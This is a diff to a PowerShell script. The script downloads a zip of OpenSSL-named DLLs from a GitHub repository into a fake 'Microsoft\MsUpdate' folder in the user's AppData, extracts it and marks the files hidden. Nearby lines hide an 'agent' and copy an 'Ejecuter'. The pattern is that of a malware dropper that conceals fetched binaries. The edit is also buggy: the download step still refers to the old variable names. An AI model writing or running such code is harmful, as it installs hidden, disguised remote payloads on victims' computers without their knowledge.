@@ -22,21 +22,17 @@ Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultos
 
 
 #Copy DLLs
-$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libssl-3.dll"
-$urlRemotoAgent = "https://github.com/emakedie/UCN/raw/refs/heads/main/libssl-3.dll"
+$rutaLocalAgentdll = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcryp.zip"
+$urlRemotoAgentdll = "https://github.com/emakedie/UCN/raw/refs/heads/main/libcryp.zip"
 if (-not (Test-Path $rutaLocalAgent)) {
     Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
 }
-$atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
-Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
-#----
-$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcrypto-3.dll"
-$urlRemotoAgent = "https://github.com/emakedie/UCN/raw/refs/heads/main/libcrypto-3.dll"
-if (-not (Test-Path $rutaLocalAgent)) {
-    Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
-}
-$atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
-Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
+$zipFile = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcryp.zip"
+$destination = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\"
+Expand-Archive -Path $zipFile -DestinationPath $destination
+Remove-Item -Path $zipFile -Force
+Set-ItemProperty -Path "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libssl-3.dll" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+Set-ItemProperty -Path "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcrypto-3.dll" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
 
 # Copy Ejecuter
